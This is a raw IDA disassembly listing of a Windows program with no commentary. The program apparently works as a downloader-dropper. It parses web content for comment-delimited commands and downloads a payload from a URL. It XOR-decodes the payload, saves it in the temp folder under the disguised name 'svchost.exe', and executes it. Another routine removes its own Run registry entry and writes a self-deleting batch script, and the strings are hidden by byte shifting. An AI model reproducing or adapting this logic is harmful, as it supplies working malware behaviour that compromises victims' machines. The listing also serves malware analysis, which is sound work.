.text:004032EC jnz     short loc_40331A ; 4 Flows to: 5, 13
.text:004032EE cmp     byte ptr [edx+ecx+2], 2Dh ; 5
.text:004032F3 jnz     short loc_40331A ; 5 Flows to: 6, 13
.text:004032F5 cmp     byte ptr [edx+ecx+3], 2Dh ; 6
.text:004032FA jnz     short loc_40331A ; 6 Flows to: 7, 13
.text:004032FC lea     esi, [edi-2]    ; 7 Flows to: 8
.text:004032FF
.text:004032FF loc_4032FF:             ; 8
.text:004032FF cmp     eax, esi
.text:00403301 jz      short loc_40331A ; 8 Flows to: 9, 13
.text:00403303 cmp     byte ptr [ecx+eax], 2Dh ; 9
.text:00403307 jnz     short loc_403317 ; 9 Flows to: 10, 12
.text:00403309 cmp     byte ptr [ecx+eax+1], 2Dh ; 10
.text:0040330E jnz     short loc_403317 ; 10 Flows to: 11, 12
.text:00403310 cmp     byte ptr [ecx+eax+2], 3Eh ; 11
.text:00403315 jz      short loc_403324 ; 11 Flows to: 12, 15
.text:00403317
.text:00403317 loc_403317:             ; 12
.text:00403317 inc     eax
.text:00403318 jmp     short loc_4032FF ; 12 Flows to: 8
.text:0040331A
.text:0040331A loc_40331A:             ; 13
.text:0040331A inc     edx
.text:0040331B lea     eax, [edi-6]    ; 13
.text:0040331E cmp     edx, eax        ; 13
.text:00403320 jz      short loc_403334 ; 13 Flows to: 14, 16
.text:00403322 jmp     short loc_4032DE ; 14 Flows to: 3
.text:00403324
.text:00403324 loc_403324:             ; 15
.text:00403324 mov     ecx, [esp+8+arg_8]
.text:00403328 sub     eax, edx        ; 15
.text:0040332A sub     eax, 4          ; 15
.text:0040332D add     edx, 4          ; 15
.text:00403330 mov     [ecx], edx      ; 15
.text:00403332 jmp     short loc_403336 ; 15 Flows to: 17
.text:00403334
.text:00403334 loc_403334:             ; 16 Flows to: 17
.text:00403334 xor     eax, eax
.text:00403336
.text:00403336 loc_403336:             ; 17
.text:00403336 pop     edi
.text:00403337 pop     esi             ; 17
.text:00403338 retn                    ; 17
.text:00403338 sub_4032CB endp
.text:00403338
.text:00403339
.text:00403339
.text:00403339 ; Attributes: bp-based frame
.text:00403339
.text:00403339 ; int __stdcall sub_403339(char *Dest)
.text:00403339 sub_403339 proc near
.text:00403339
.text:00403339 Str2= dword ptr -4
.text:00403339 Dest= dword ptr  8
.text:00403339
.text:00403339 push    ebp             ; 1
.text:0040333A mov     ebp, esp        ; 1
.text:0040333C push    ecx             ; 1
.text:0040333D push    ebx             ; 1
.text:0040333E mov     ebx, [ebp+Dest] ; 1
.text:00403341 test    ebx, ebx        ; 1
.text:00403343 jnz     short loc_40334D ; 1 Flows to: 2, 3
.text:00403345 push    1               ; 2
.text:00403347 pop     eax             ; 2
.text:00403348 jmp     loc_4033EF      ; 2 Flows to: 15
.text:0040334D
.text:0040334D loc_40334D:             ; 3
.text:0040334D push    esi
.text:0040334E mov     esi, 100h       ; 3
.text:00403353 push    edi             ; 3
.text:00403354 push    esi             ; 3
.text:00403355 call    ??2@YAPAXI@Z    ; 3
.text:0040335A push    esi             ; 3
.text:0040335B mov     edi, eax        ; 3
.text:0040335D call    ??2@YAPAXI@Z    ; 3
.text:00403362 pop     ecx             ; 3
.text:00403363 mov     [ebp+Dest], eax ; 3
.text:00403366 test    edi, edi        ; 3
.text:00403368 pop     ecx             ; 3
.text:00403369 jz      short loc_4033C9 ; 3 Flows to: 4, 10
.text:0040336B test    eax, eax        ; 4
.text:0040336D jz      short loc_4033C9 ; 4 Flows to: 5, 10
.text:0040336F cmp     byte ptr [ebx+4], 3Ah ; 5
.text:00403373 jnz     short loc_40337E ; 5 Flows to: 6, 7
.text:00403375 and     [ebp+Str2], 0   ; 6
.text:00403379 lea     eax, [ebx+7]    ; 6
.text:0040337C jmp     short loc_403388 ; 6 Flows to: 8
.text:0040337E
.text:0040337E loc_40337E:             ; 7
.text:0040337E mov     [ebp+Str2], 1
.text:00403385 lea     eax, [ebx+8]    ; 7 Flows to: 8
.text:00403388
.text:00403388 loc_403388:             ; 8
.text:00403388 push    eax
.text:00403389 push    edi             ; 8
.text:0040338A call    strcpy          ; 8
.text:0040338F pop     ecx             ; 8
.text:00403390 pop     ecx             ; 8
.text:00403391 push    2Fh             ; 8
.text:00403393 push    edi             ; 8
.text:00403394 call    ds:strchr       ; 8
.text:0040339A mov     esi, eax        ; 8
.text:0040339C pop     ecx             ; 8
.text:0040339D test    esi, esi        ; 8
.text:0040339F pop     ecx             ; 8
.text:004033A0 jz      short loc_4033C9 ; 8 Flows to: 9, 10
.text:004033A2 push    esi             ; 9
.text:004033A3 push    [ebp+Dest]      ; 9
.text:004033A6 call    strcpy          ; 9
.text:004033AB push    [ebp+Str2]      ; 9
.text:004033AE and     byte ptr [esi], 0 ; 9
.text:004033B1 push    [ebp+Dest]      ; 9
.text:004033B4 push    offset Dest     ; 9
.text:004033B9 push    edi             ; 9
.text:004033BA call    sub_401406      ; 9
.text:004033BF add     esp, 18h        ; 9
.text:004033C2 and     dword_405918, 0 ; 9 Flows to: 10
.text:004033C9
.text:004033C9 loc_4033C9:             ; 10
.text:004033C9 push    ebx
.text:004033CA call    ??3@YAXPAX@Z    ; 10
.text:004033CF cmp     [ebp+Dest], 0   ; 10
.text:004033D3 pop     ecx             ; 10
.text:004033D4 jz      short loc_4033DF ; 10 Flows to: 11, 12
.text:004033D6 push    [ebp+Dest]      ; 11
.text:004033D9 call    ??3@YAXPAX@Z    ; 11
.text:004033DE pop     ecx             ; 11 Flows to: 12
.text:004033DF
.text:004033DF loc_4033DF:             ; 12
.text:004033DF test    edi, edi
.text:004033E1 jz      short loc_4033EA ; 12 Flows to: 13, 14
.text:004033E3 push    edi             ; 13
.text:004033E4 call    ??3@YAXPAX@Z    ; 13
.text:004033E9 pop     ecx             ; 13 Flows to: 14
.text:004033EA
.text:004033EA loc_4033EA:             ; 14
.text:004033EA push    1
.text:004033EC pop     eax             ; 14
.text:004033ED pop     edi             ; 14
.text:004033EE pop     esi             ; 14 Flows to: 15
.text:004033EF
.text:004033EF loc_4033EF:             ; 15
.text:004033EF pop     ebx
.text:004033F0 leave                   ; 15
.text:004033F1 retn    4               ; 15
.text:004033F1 sub_403339 endp
.text:004033F1
.text:004033F4
.text:004033F4
.text:004033F4 ; Attributes: bp-based frame
.text:004033F4
.text:004033F4 ; DWORD __stdcall sub_4033F4(LPVOID lpThreadParameter)
.text:004033F4 sub_4033F4 proc near
.text:004033F4
.text:004033F4 Source= byte ptr -132Ch
.text:004033F4 Buffer= byte ptr -32Ch
.text:004033F4 TempFileName= byte ptr -228h
.text:004033F4 Dest= byte ptr -124h
.text:004033F4 NumberOfBytesWritten= dword ptr -20h
.text:004033F4 File= byte ptr -1Ch
.text:004033F4 var_18= dword ptr -18h
.text:004033F4 hFile= dword ptr -14h
.text:004033F4 var_10= byte ptr -10h
.text:004033F4 var_F= byte ptr -0Fh
.text:004033F4 var_E= byte ptr -0Eh
.text:004033F4 var_D= byte ptr -0Dh
.text:004033F4 var_C= byte ptr -0Ch
.text:004033F4 var_B= byte ptr -0Bh
.text:004033F4 var_A= byte ptr -0Ah
.text:004033F4 var_9= byte ptr -9
.text:004033F4 var_8= byte ptr -8
.text:004033F4 var_7= byte ptr -7
.text:004033F4 var_6= byte ptr -6
.text:004033F4 var_5= byte ptr -5
.text:004033F4 NumberOfBytesRead= dword ptr -4
.text:004033F4 lpThreadParameter= dword ptr  8
.text:004033F4
.text:004033F4 push    ebp             ; 1
.text:004033F5 mov     ebp, esp        ; 1
.text:004033F7 mov     eax, 132Ch      ; 1
.text:004033FC call    __alloca_probe  ; 1
.text:00403401 mov     eax, dword_405898 ; 1
.text:00403406 push    ebx             ; 1
.text:00403407 mov     dword ptr [ebp+File], eax ; 1
.text:0040340A mov     eax, dword_40589C ; 1
.text:0040340F xor     ebx, ebx        ; 1
.text:00403411 mov     [ebp+var_18], eax ; 1
.text:00403414 cmp     [ebp+lpThreadParameter], ebx ; 1
.text:00403417 jnz     short loc_403421 ; 1 Flows to: 2, 3
.text:00403419 push    1               ; 2
.text:0040341B pop     eax             ; 2
.text:0040341C jmp     loc_4035BD      ; 2 Flows to: 14
.text:00403421
.text:00403421 loc_403421:             ; 3
.text:00403421 mov     [ebp+var_10], 0E6h
.text:00403425 mov     [ebp+var_F], 0ECh ; 3
.text:00403429 mov     [ebp+var_E], 0C6h ; 3
.text:0040342D mov     [ebp+var_D], 0D0h ; 3
.text:00403431 mov     [ebp+var_C], 0DEh ; 3
.text:00403435 mov     [ebp+var_B], 0E6h ; 3
.text:00403439 mov     [ebp+var_A], 0E8h ; 3
.text:0040343D mov     [ebp+var_9], 5Ch ; 3
.text:00403441 mov     [ebp+var_8], 0CAh ; 3
.text:00403445 mov     [ebp+var_7], 0F0h ; 3
.text:00403449 mov     [ebp+var_6], 0CAh ; 3
.text:0040344D mov     [ebp+var_5], bl ; 3
.text:00403450 xor     eax, eax        ; 3 Flows to: 4
.text:00403452
.text:00403452 loc_403452:             ; 4
.text:00403452 mov     cl, [ebp+eax+var_10]
.text:00403456 shr     cl, 1           ; 4
.text:00403458 mov     [ebp+eax+Source], cl ; 4
.text:0040345F inc     eax             ; 4
.text:00403460 cmp     eax, 0Ch        ; 4
.text:00403463 jl      short loc_403452 ; 4 Flows to: 5, 4
.text:00403465 xor     eax, eax        ; 5 Flows to: 6
.text:00403467
.text:00403467 loc_403467:             ; 6
.text:00403467 inc     [ebp+eax+File]
.text:0040346B inc     eax             ; 6
.text:0040346C cmp     eax, 7          ; 6
.text:0040346F jl      short loc_403467 ; 6 Flows to: 7, 6
.text:00403471 push    esi             ; 7
.text:00403472 mov     esi, ds:GetTempPathA ; 7
.text:00403478 push    edi             ; 7
.text:00403479 lea     eax, [ebp+Buffer] ; 7
.text:0040347F mov     edi, 104h       ; 7
.text:00403484 push    eax             ; 7
.text:00403485 push    edi             ; 7
.text:00403486 call    esi ; GetTempPathA ; 7
.text:00403488 lea     eax, [ebp+TempFileName] ; 7
.text:0040348E push    eax             ; 7
.text:0040348F push    ebx             ; 7
.text:00403490 lea     eax, [ebp+Buffer] ; 7
.text:00403496 push    offset PrefixString ; 7
.text:0040349B push    eax             ; 7
.text:0040349C call    ds:GetTempFileNameA ; 7
.text:004034A2 push    ebx             ; 7
.text:004034A3 lea     eax, [ebp+TempFileName] ; 7
.text:004034A9 push    ebx             ; 7
.text:004034AA push    eax             ; 7
.text:004034AB push    [ebp+lpThreadParameter] ; 7
.text:004034AE push    ebx             ; 7
.text:004034AF call    URLDownloadToFileA ; 7
.text:004034B4 push    ebx             ; 7
.text:004034B5 push    80h             ; 7
.text:004034BA push    3               ; 7
.text:004034BC push    ebx             ; 7
.text:004034BD push    ebx             ; 7
.text:004034BE lea     eax, [ebp+TempFileName] ; 7
.text:004034C4 push    80000000h       ; 7
.text:004034C9 push    eax             ; 7
.text:004034CA call    ds:CreateFileA  ; 7
.text:004034D0 mov     [ebp+lpThreadParameter], eax ; 7
.text:004034D3 lea     eax, [ebp+Dest] ; 7
.text:004034D9 push    eax             ; 7
.text:004034DA push    edi             ; 7
.text:004034DB call    esi ; GetTempPathA ; 7
.text:004034DD lea     eax, [ebp+Source] ; 7
.text:004034E3 push    eax             ; 7
.text:004034E4 lea     eax, [ebp+Dest] ; 7
.text:004034EA push    eax             ; 7
.text:004034EB call    strcat          ; 7
.text:004034F0 pop     ecx             ; 7
.text:004034F1 lea     eax, [ebp+Dest] ; 7
.text:004034F7 pop     ecx             ; 7
.text:004034F8 push    ebx             ; 7
.text:004034F9 push    80h             ; 7
.text:004034FE push    2               ; 7
.text:00403500 push    ebx             ; 7
.text:00403501 push    ebx             ; 7
.text:00403502 push    40000000h       ; 7
.text:00403507 push    eax             ; 7
.text:00403508 call    ds:CreateFileA  ; 7
.text:0040350E mov     [ebp+hFile], eax ; 7 Flows to: 8
.text:00403511
.text:00403511 loc_403511:             ; 8
.text:00403511 lea     eax, [ebp+NumberOfBytesRead]
.text:00403514 push    ebx             ; 8
.text:00403515 push    eax             ; 8
.text:00403516 lea     eax, [ebp+Source] ; 8
.text:0040351C push    1000h           ; 8
.text:00403521 push    eax             ; 8
.text:00403522 push    [ebp+lpThreadParameter] ; 8
.text:00403525 call    ds:ReadFile     ; 8
.text:0040352B test    eax, eax        ; 8
.text:0040352D jz      short loc_40355C ; 8 Flows to: 9, 12
.text:0040352F xor     eax, eax        ; 9
.text:00403531 cmp     [ebp+NumberOfBytesRead], ebx ; 9
.text:00403534 jbe     short loc_403544 ; 9 Flows to: 10, 11
.text:00403536
.text:00403536 loc_403536:             ; 10
.text:00403536 xor     [ebp+eax+Source], 5Bh
.text:0040353E inc     eax             ; 10
.text:0040353F cmp     eax, [ebp+NumberOfBytesRead] ; 10
.text:00403542 jb      short loc_403536 ; 10 Flows to: 11, 10
.text:00403544
.text:00403544 loc_403544:             ; 11
.text:00403544 lea     eax, [ebp+NumberOfBytesWritten]
.text:00403547 push    ebx             ; 11
.text:00403548 push    eax             ; 11
.text:00403549 lea     eax, [ebp+Source] ; 11
.text:0040354F push    [ebp+NumberOfBytesRead] ; 11
.text:00403552 push    eax             ; 11
.text:00403553 push    [ebp+hFile]     ; 11
.text:00403556 call    ds:WriteFile    ; 11 Flows to: 12
.text:0040355C
.text:0040355C loc_40355C:             ; 12
.text:0040355C cmp     [ebp+NumberOfBytesRead], ebx
.text:0040355F jnz     short loc_403511 ; 12 Flows to: 13, 8
.text:00403561 push    [ebp+lpThreadParameter] ; 13
.text:00403564 call    ds:CloseHandle  ; 13
.text:0040356A push    [ebp+hFile]     ; 13
.text:0040356D call    ds:CloseHandle  ; 13
.text:00403573 lea     eax, [ebp+Dest] ; 13
.text:00403579 push    eax             ; 13
.text:0040357A lea     eax, [ebp+Source] ; 13
.text:00403580 push    offset aCS      ; 13
.text:00403585 push    eax             ; 13
.text:00403586 call    ds:sprintf      ; 13
.text:0040358C add     esp, 0Ch        ; 13
.text:0040358F lea     eax, [ebp+Dest] ; 13
.text:00403595 push    eax             ; 13
.text:00403596 push    edi             ; 13
.text:00403597 call    esi ; GetTempPathA ; 13
.text:00403599 lea     eax, [ebp+Dest] ; 13
.text:0040359F push    ebx             ; 13
.text:004035A0 push    eax             ; 13
.text:004035A1 lea     eax, [ebp+Source] ; 13
.text:004035A7 push    eax             ; 13
.text:004035A8 lea     eax, [ebp+File] ; 13
.text:004035AB push    eax             ; 13
.text:004035AC push    offset Operation ; 13
.text:004035B1 push    ebx             ; 13
.text:004035B2 call    ds:ShellExecuteA ; 13
.text:004035B8 push    1               ; 13
.text:004035BA pop     eax             ; 13
.text:004035BB pop     edi             ; 13
.text:004035BC pop     esi             ; 13 Flows to: 14
.text:004035BD
.text:004035BD loc_4035BD:             ; 14
.text:004035BD pop     ebx
.text:004035BE leave                   ; 14
.text:004035BF retn    4               ; 14
.text:004035BF sub_4033F4 endp
.text:004035BF
.text:004035C2
.text:004035C2
.text:004035C2 ; Attributes: noreturn bp-based frame
.text:004035C2
.text:004035C2 sub_4035C2 proc near
.text:004035C2
.text:004035C2 var_88= dword ptr -88h
.text:004035C2 Format= byte ptr -78h
.text:004035C2 var_44= byte ptr -44h
.text:004035C2 var_43= byte ptr -43h
.text:004035C2 var_42= byte ptr -42h
.text:004035C2 var_41= byte ptr -41h
.text:004035C2 var_40= byte ptr -40h
.text:004035C2 var_3F= byte ptr -3Fh
.text:004035C2 var_3E= byte ptr -3Eh
.text:004035C2 var_3D= byte ptr -3Dh
.text:004035C2 var_3C= byte ptr -3Ch
.text:004035C2 var_3B= byte ptr -3Bh
.text:004035C2 var_3A= byte ptr -3Ah
.text:004035C2 var_39= byte ptr -39h
.text:004035C2 var_38= byte ptr -38h
.text:004035C2 var_37= byte ptr -37h
.text:004035C2 var_36= byte ptr -36h
.text:004035C2 var_35= byte ptr -35h
.text:004035C2 var_34= byte ptr -34h
.text:004035C2 var_33= byte ptr -33h
.text:004035C2 var_32= byte ptr -32h
.text:004035C2 var_31= byte ptr -31h
.text:004035C2 var_30= byte ptr -30h
.text:004035C2 var_2F= byte ptr -2Fh
.text:004035C2 var_2E= byte ptr -2Eh
.text:004035C2 var_2D= byte ptr -2Dh
.text:004035C2 var_2C= byte ptr -2Ch
.text:004035C2 var_2B= byte ptr -2Bh
.text:004035C2 var_2A= byte ptr -2Ah
.text:004035C2 var_29= byte ptr -29h
.text:004035C2 var_28= byte ptr -28h
.text:004035C2 var_27= byte ptr -27h
.text:004035C2 var_26= byte ptr -26h
.text:004035C2 var_25= byte ptr -25h
.text:004035C2 var_24= byte ptr -24h
.text:004035C2 var_23= byte ptr -23h
.text:004035C2 var_22= byte ptr -22h
.text:004035C2 var_21= byte ptr -21h
.text:004035C2 var_20= byte ptr -20h
.text:004035C2 var_1F= byte ptr -1Fh
.text:004035C2 var_1E= byte ptr -1Eh
.text:004035C2 var_1D= byte ptr -1Dh
.text:004035C2 var_1C= byte ptr -1Ch
.text:004035C2 var_1B= byte ptr -1Bh
.text:004035C2 var_1A= byte ptr -1Ah
.text:004035C2 var_19= byte ptr -19h
.text:004035C2 var_18= byte ptr -18h
.text:004035C2 var_17= byte ptr -17h
.text:004035C2 var_16= byte ptr -16h
.text:004035C2 var_15= byte ptr -15h
.text:004035C2 var_14= byte ptr -14h
.text:004035C2 var_13= byte ptr -13h
.text:004035C2 NumberOfBytesWritten= dword ptr -10h
.text:004035C2 hFile= dword ptr -0Ch
.text:004035C2 phkResult= dword ptr -8
.text:004035C2 Dest= dword ptr -4
.text:004035C2
.text:004035C2 push    ebp             ; 1
.text:004035C3 mov     ebp, esp        ; 1
.text:004035C5 sub     esp, 78h        ; 1
.text:004035C8 push    ebx             ; 1
.text:004035C9 xor     ebx, ebx        ; 1
.text:004035CB push    esi             ; 1
.text:004035CC push    edi             ; 1
.text:004035CD mov     [ebp+var_44], 74h ; 1
.text:004035D1 mov     [ebp+var_43], 84h ; 1
.text:004035D5 mov     [ebp+var_42], 8Ah ; 1
.text:004035D9 mov     [ebp+var_41], 8Eh ; 1
.text:004035DD mov     [ebp+var_40], 92h ; 1
.text:004035E1 mov     [ebp+var_3F], 9Ch ; 1
.text:004035E5 mov     [ebp+var_3E], 1Ah ; 1
.text:004035E9 mov     [ebp+var_3D], 14h ; 1
.text:004035ED mov     [ebp+var_3C], 0C8h ; 1
.text:004035F1 mov     [ebp+var_3B], 0CAh ; 1
.text:004035F5 mov     [ebp+var_3A], 0D8h ; 1
.text:004035F9 mov     [ebp+var_39], 40h ; 1
.text:004035FD mov     [ebp+var_38], 4Ah ; 1
.text:00403601 mov     [ebp+var_37], 0E6h ; 1
.text:00403605 mov     [ebp+var_36], 40h ; 1
.text:00403609 mov     [ebp+var_35], 1Ah ; 1
.text:0040360D mov     [ebp+var_34], 14h ; 1
.text:00403611 mov     [ebp+var_33], 0D2h ; 1
.text:00403615 mov     [ebp+var_32], 0CCh ; 1
.text:00403619 mov     [ebp+var_31], 40h ; 1
.text:0040361D mov     [ebp+var_30], 0CAh ; 1
.text:00403621 mov     [ebp+var_2F], 0F0h ; 1
.text:00403625 mov     [ebp+var_2E], 0D2h ; 1
.text:00403629 mov     [ebp+var_2D], 0E6h ; 1
.text:0040362D mov     [ebp+var_2C], 0E8h ; 1
.text:00403631 mov     [ebp+var_2B], 40h ; 1
.text:00403635 mov     [ebp+var_2A], 4Ah ; 1
.text:00403639 mov     [ebp+var_29], 0E6h ; 1
.text:0040363D mov     [ebp+var_28], 40h ; 1
.text:00403641 mov     [ebp+var_27], 0CEh ; 1
.text:00403645 mov     [ebp+var_26], 0DEh ; 1
.text:00403649 mov     [ebp+var_25], 0E8h ; 1
.text:0040364D mov     [ebp+var_24], 0DEh ; 1
.text:00403651 mov     [ebp+var_23], 40h ; 1
.text:00403655 mov     [ebp+var_22], 84h ; 1
.text:00403659 mov     [ebp+var_21], 8Ah ; 1
.text:0040365D mov     [ebp+var_20], 8Eh ; 1
.text:00403661 mov     [ebp+var_1F], 92h ; 1
.text:00403665 mov     [ebp+var_1E], 9Ch ; 1
.text:00403669 mov     [ebp+var_1D], 1Ah ; 1
.text:0040366D mov     [ebp+var_1C], 14h ; 1
.text:00403671 mov     [ebp+var_1B], 0C8h ; 1
.text:00403675 mov     [ebp+var_1A], 0CAh ; 1
.text:00403679 mov     [ebp+var_19], 0D8h ; 1
.text:0040367D mov     [ebp+var_18], 40h ; 1
.text:00403681 mov     [ebp+var_17], 4Ah ; 1
.text:00403685 mov     [ebp+var_16], 0E6h ; 1
.text:00403689 mov     [ebp+var_15], 1Ah ; 1
.text:0040368D mov     [ebp+var_14], 14h ; 1
.text:00403691 mov     [ebp+var_13], bl ; 1
.text:00403694 xor     eax, eax        ; 1 Flows to: 2
.text:00403696
.text:00403696 loc_403696:             ; 2
.text:00403696 mov     cl, [ebp+eax+var_44]
.text:0040369A shr     cl, 1           ; 2
.text:0040369C mov     [ebp+eax+Format], cl ; 2
.text:004036A0 inc     eax             ; 2
.text:004036A1 cmp     eax, 32h        ; 2
.text:004036A4 jl      short loc_403696 ; 2 Flows to: 3, 2
.text:004036A6 lea     eax, [ebp+phkResult] ; 3
.text:004036A9 push    ebx             ; 3
.text:004036AA push    eax             ; 3
.text:004036AB push    ebx             ; 3
.text:004036AC push    0F003Fh         ; 3
.text:004036B1 push    ebx             ; 3
.text:004036B2 push    ebx             ; 3
.text:004036B3 push    ebx             ; 3
.text:004036B4 push    offset SubKey   ; 3
.text:004036B9 push    80000001h       ; 3
.text:004036BE call    ds:RegCreateKeyExA ; 3
.text:004036C4 push    offset ValueName ; 3
.text:004036C9 push    [ebp+phkResult] ; 3
.text:004036CC call    ds:RegDeleteValueA ; 3
.text:004036D2 push    [ebp+phkResult] ; 3
.text:004036D5 call    ds:RegCloseKey  ; 3
.text:004036DB mov     esi, 104h       ; 3
.text:004036E0 push    esi             ; 3
.text:004036E1 call    ??2@YAPAXI@Z    ; 3
.text:004036E6 mov     edi, eax        ; 3
.text:004036E8 mov     [esp+88h+var_88], 400h ; 3
.text:004036EF call    ??2@YAPAXI@Z    ; 3
.text:004036F4 pop     ecx             ; 3
.text:004036F5 mov     [ebp+Dest], eax ; 3
.text:004036F8 push    esi             ; 3
.text:004036F9 push    edi             ; 3
.text:004036FA push    ebx             ; 3
.text:004036FB call    ds:GetModuleFileNameA ; 3
.text:00403701 push    edi             ; 3
.text:00403702 push    offset aS_0     ; 3
.text:00403707 push    [ebp+Dest]      ; 3
.text:0040370A mov     [eax+edi], bl   ; 3
.text:0040370D call    ds:sprintf      ; 3
.text:00403713 push    [ebp+Dest]      ; 3
.text:00403716 push    edi             ; 3
.text:00403717 call    strcpy          ; 3
.text:0040371C mov     esi, offset File ; 3
.text:00403721 lea     eax, [ebp+Format] ; 3
.text:00403724 push    esi             ; 3
.text:00403725 push    edi             ; 3
.text:00403726 push    edi             ; 3
.text:00403727 push    eax             ; 3
.text:00403728 push    [ebp+Dest]      ; 3
.text:0040372B call    ds:sprintf      ; 3
.text:00403731 add     esp, 28h        ; 3
.text:00403734 push    ebx             ; 3
.text:00403735 push    80h             ; 3
.text:0040373A push    2               ; 3
.text:0040373C push    ebx             ; 3
.text:0040373D push    4               ; 3
.text:0040373F push    40000000h       ; 3
.text:00403744 push    esi             ; 3
.text:00403745 call    ds:CreateFileA  ; 3
.text:0040374B push    [ebp+Dest]      ; 3
.text:0040374E mov     [ebp+hFile], eax ; 3
.text:00403751 call    ds:lstrlenA     ; 3
.text:00403757 lea     ecx, [ebp+NumberOfBytesWritten] ; 3
.text:0040375A push    ebx             ; 3
.text:0040375B push    ecx             ; 3
.text:0040375C push    eax             ; 3
.text:0040375D push    [ebp+Dest]      ; 3
.text:00403760 push    [ebp+hFile]     ; 3
.text:00403763 call    ds:WriteFile    ; 3
.text:00403769 push    [ebp+hFile]     ; 3
.text:0040376C call    ds:CloseHandle  ; 3
.text:00403772 push    edi             ; 3
.text:00403773 call    ??3@YAXPAX@Z    ; 3
.text:00403778 push    [ebp+Dest]      ; 3
.text:0040377B call    ??3@YAXPAX@Z    ; 3
.text:00403780 pop     ecx             ; 3
.text:00403781 pop     ecx             ; 3
.text:00403782 push    ebx             ; 3
.text:00403783 push    ebx             ; 3
.text:00403784 push    ebx             ; 3
.text:00403785 push    esi             ; 3
.text:00403786 push    ebx             ; 3
.text:00403787 push    ebx             ; 3
.text:00403788 call    ds:ShellExecuteA ; 3
.text:0040378E push    ebx             ; 3
.text:0040378F call    ds:ExitProcess  ; 3
.text:0040378F sub_4035C2 endp
.text:0040378F
.text:00403795 pop     edi
.text:00403796 pop     esi
.text:00403797 pop     ebx
.text:00403798
.text:00403798
.text:00403798 ; Attributes: bp-based frame
.text:00403798
.text:00403798 sub_403798 proc near
.text:00403798
.text:00403798 Dst= byte ptr -44h
.text:00403798 var_40= byte ptr -40h
.text:00403798 arg_0= dword ptr  8
.text:00403798
.text:00403798 push    ebp             ; 1
.text:00403799 mov     ebp, esp        ; 1
.text:0040379B sub     esp, 44h        ; 1
.text:0040379E push    43h             ; 1
.text:004037A0 lea     eax, [ebp+Dst]  ; 1
.text:004037A3 push    0               ; 1
.text:004037A5 push    eax             ; 1
.text:004037A6 call    memset          ; 1
.text:004037AB add     esp, 0Ch        ; 1
.text:004037AE lea     eax, [ebp+Dst]  ; 1
.text:004037B1 push    61h             ; 1
.text:004037B3 pop     ecx             ; 1
.text:004037B4 sub     eax, ecx        ; 1 Flows to: 2
.text:004037B6
.text:004037B6 loc_4037B6:             ; 2
.text:004037B6 mov     [eax+ecx], cl
.text:004037B9 inc     ecx             ; 2
.text:004037BA cmp     ecx, 7Ah        ; 2
.text:004037BD jle     short loc_4037B6 ; 2 Flows to: 3, 2
.text:004037BF push    41h             ; 3
.text:004037C1 lea     ecx, [ebp+Dst]  ; 3
.text:004037C4 pop     eax             ; 3
.text:004037C5 sub     ecx, 27h        ; 3 Flows to: 4
.text:004037C8
.text:004037C8 loc_4037C8:             ; 4
.text:004037C8 mov     [ecx+eax], al
.text:004037CB inc     eax             ; 4
.text:004037CC cmp     eax, 5Ah        ; 4
.text:004037CF jle     short loc_4037C8 ; 4 Flows to: 5, 4
.text:004037D1 push    30h             ; 5
.text:004037D3 pop     eax             ; 5 Flows to: 6
.text:004037D4
.text:004037D4 loc_4037D4:             ; 6
.text:004037D4 mov     [ebp+eax+var_40], al
.text:004037D8 inc     eax             ; 6
.text:004037D9 cmp     eax, 39h        ; 6
.text:004037DC jle     short loc_4037D4 ; 6 Flows to: 7, 6
.text:004037DE lea     eax, [ebp+Dst]  ; 7
.text:004037E1 push    offset asc_4058B0 ; 7
.text:004037E6 push    eax             ; 7
.text:004037E7 call    strcat          ; 7
.text:004037EC pop     ecx             ; 7
.text:004037ED pop     ecx             ; 7
.text:004037EE mov     ecx, [ebp+arg_0] ; 7
.text:004037F1 test    ecx, ecx        ; 7
.text:004037F3 jz      short locret_40382B ; 7 Flows to: 8, 18
.text:004037F5 mov     al, [ecx]       ; 8
.text:004037F7 test    al, al          ; 8
.text:004037F9 jz      short locret_40382B ; 8 Flows to: 9, 18
.text:004037FB push    esi             ; 9 Flows to: 10
.text:004037FC
.text:004037FC loc_4037FC:             ; 10
.text:004037FC cmp     al, 23h
.text:004037FE jnz     short loc_403805 ; 10 Flows to: 11, 12
.text:00403800 mov     byte ptr [ecx], 3Ah ; 11
.text:00403803 jmp     short loc_403822 ; 11 Flows to: 16
.text:00403805
.text:00403805 loc_403805:             ; 12 Flows to: 13
.text:00403805 xor     edx, edx
.text:00403807
.text:00403807 loc_403807:             ; 13
.text:00403807 cmp     [ebp+edx+Dst], al
.text:0040380B jz      short loc_403813 ; 13 Flows to: 14, 15
.text:0040380D inc     edx             ; 14
.text:0040380E cmp     edx, 42h        ; 14
.text:00403811 jl      short loc_403807 ; 14 Flows to: 15, 13
.text:00403813
.text:00403813 loc_403813:             ; 15
.text:00403813 lea     eax, [edx+38h]
.text:00403816 push    42h             ; 15
.text:00403818 cdq                     ; 15
.text:00403819 pop     esi             ; 15
.text:0040381A idiv    esi             ; 15
.text:0040381C mov     al, [ebp+edx+Dst] ; 15
.text:00403820 mov     [ecx], al       ; 15 Flows to: 16
.text:00403822
.text:00403822 loc_403822:             ; 16
.text:00403822 mov     al, [ecx+1]
.text:00403825 inc     ecx             ; 16
.text:00403826 test    al, al          ; 16
.text:00403828 jnz     short loc_4037FC ; 16 Flows to: 17, 10
.text:0040382A pop     esi             ; 17 Flows to: 18
.text:0040382B
.text:0040382B locret_40382B:          ; 18
.text:0040382B leave
.text:0040382C retn                    ; 18
.text:0040382C sub_403798 endp
.text:0040382C
.text:0040382D align 2
.text:0040382E ; [00000006 BYTES: COLLAPSED FUNCTION Process32Next. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403834 ; [00000006 BYTES: COLLAPSED FUNCTION Process32First. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:0040383A ; [00000006 BYTES: COLLAPSED FUNCTION CreateToolhelp32Snapshot. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403840 ; [00000006 BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403846 ; [00000006 BYTES: COLLAPSED FUNCTION strlen. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:0040384C ; [00000006 BYTES: COLLAPSED FUNCTION strcpy. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403852 ; [00000006 BYTES: COLLAPSED FUNCTION operator new(uint). PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00403858 ; [00000006 BYTES: COLLAPSED FUNCTION memset. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:0040385E align 10h
.text:00403860
.text:00403860 loc_403860:
.text:00403860 jmp     ds:_except_handler3
